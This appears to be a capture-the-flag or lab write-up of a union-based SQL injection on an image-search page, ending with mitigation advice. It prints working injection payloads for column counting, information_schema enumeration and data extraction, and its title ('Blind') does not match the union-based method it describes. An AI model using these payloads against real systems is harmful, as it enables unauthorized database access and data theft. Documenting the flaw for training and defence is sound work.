
## 📌 Breach Name: Blind SQL Injection

## Overview
This document describes how to exploit a SQL injection vulnerability found in the image list page of a web application. By leveraging union-based SQL injection, we retrieve database structure details and extract sensitive information from the `list_images` table.
## 📌 Vulnerability Type:
- **CWE-89: SQL Injection**
- **CWE-20: Improper Input Validation**
## Vulnerability Details
* **Type:** SQL Injection
* **Vulnerable Parameter:** `id`
* **Affected URL:** `http://10.11.100.164/?page=searchimg`

## Source of the Vulnerability
The page contains a form to search for images by ID:

```html
<form action="#" method="GET">
  <input type="hidden" name="page" value="listimg">
  <input type="text" name="id"> <br />
  <input type="submit" name="Submit" value="Submit">
</form>
```

A valid search query (e.g., `id=1`) returns:

```
ID: 1
Title: Nature
Comment: Beautiful mountain view
```

Injecting `1 OR 1=1` returns multiple results:

```
ID: 1 OR 1=1
Title: Nature
Comment: Beautiful mountain view

ID: 2
Title: Cityscape
Comment: Downtown at night
```

This confirms the presence of an SQL injection vulnerability.

## Exploitation Steps

### 1. Determining the Number of Columns
Testing different payloads, we discover that two columns are required:

```sql
1 UNION SELECT NULL, NULL--
```

This query succeeds, confirming two columns.

### 2. Retrieving Table Names
Using `information_schema.tables` to list tables:

```sql
1 UNION SELECT table_name, NULL FROM information_schema.tables--
```

We discover a table named:

```
list_images
```

### 3. Retrieving Column Names
To avoid quoting issues, the table name is converted to hexadecimal:

```bash
echo -n "list_images" | xxd -p | awk '{printf "0x%s", $0}'
```

Result:
```
0x6c6973745f696d61676573
```

Fetching column names:

```sql
1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573--
```

Important columns identified:
```
title
comment
```

### 4. Extracting Data from the list_images Table
Extracting titles:

```sql
1 UNION SELECT title, NULL FROM list_images--
```

Extracting comments:

```sql
1 UNION SELECT comment, NULL FROM list_images--
```

Example extracted data:

```
Title: Welcome
Comment: Secret info hidden here
```

## Impact
* **Database Enumeration:** Attackers can enumerate database structure.
* **Data Leakage:** Sensitive data, including internal comments or notes, may be exposed.
* **Potential Further Exploitation:** Extracted data could aid in deeper attacks.

## Mitigation Strategies
1. **Use Parameterized Queries:** Always use prepared statements when handling user input.
2. **Input Validation:** Sanitize and validate all user inputs.
3. **Principle of Least Privilege:** Restrict database user permissions.
4. **Web Application Firewall (WAF):** Deploy a WAF to help detect and block SQL injection attempts.

## Conclusion
The SQL injection vulnerability allowed enumeration of the database and extraction of sensitive data. Implementing proper input sanitization and secure coding practices would have prevented this issue.